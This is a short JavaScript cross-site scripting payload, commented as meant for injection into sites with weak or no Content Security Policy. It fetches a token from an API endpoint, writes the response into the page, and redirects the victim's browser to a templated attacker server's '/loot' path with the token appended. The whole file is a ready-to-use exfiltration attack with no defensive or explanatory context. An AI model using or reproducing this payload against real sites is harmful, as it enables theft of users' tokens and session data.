// Inject this script against sites with bad CSP or no CSP
alert('Origin: ' + origin);
try {
  fetch('https://exmaple:8282/api/1.0/token')
  .then(r => r.text())
  .then(t => {
    document.open();
    document.write(t);
    document.close();
    window.location.replace('{{serveraddr}}/loot?content=' + t);
  })
  .catch(e => console.error(e))
} catch (error) {
  console.error(error);
}
